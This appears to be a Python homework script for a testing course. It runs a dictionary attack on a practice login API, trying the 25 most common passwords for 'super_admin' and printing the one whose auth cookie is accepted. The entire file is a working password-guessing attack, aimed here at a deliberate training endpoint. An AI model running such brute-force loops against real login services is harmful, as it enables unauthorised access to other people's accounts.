import requests

with open("top_25_passwords.txt", "r") as passwords_file:
    for line in passwords_file:
        password = line.strip()
        get_cookie_response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                            data={"login": "super_admin", "password": password})
        cookie = get_cookie_response.cookies
        check_cookie_response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie)
        if "You are NOT authorized" in check_cookie_response.text:
            continue
        else:
            print(password, check_cookie_response.text)
